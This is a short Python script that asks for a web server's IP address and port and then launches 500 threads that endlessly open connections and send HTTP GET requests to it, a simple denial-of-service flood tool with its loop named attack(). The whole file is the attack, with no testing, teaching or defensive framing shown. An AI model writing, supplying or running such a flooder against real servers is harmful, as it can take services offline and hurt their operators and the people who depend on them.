import threading
import socket

target = input("Enter the IP address of the target web server: ")
port = int(input("Enter the port number of the target web server: "))
message = "GET / HTTP/1.1\r\nHost: " + target + "\r\n\r\n"
threads = []

# Function to send requests to the server
def attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.send(message.encode())
            s.close()
        except:
            s.close()

# Start multiple threads to send requests simultaneously
for i in range(500):
    thread = threading.Thread(target=attack)
    thread.daemon = True
    threads.append(thread)

# Start the threads
for thread in threads:
    thread.start()

# Wait for the threads to finish
for thread in threads:
    thread.join()
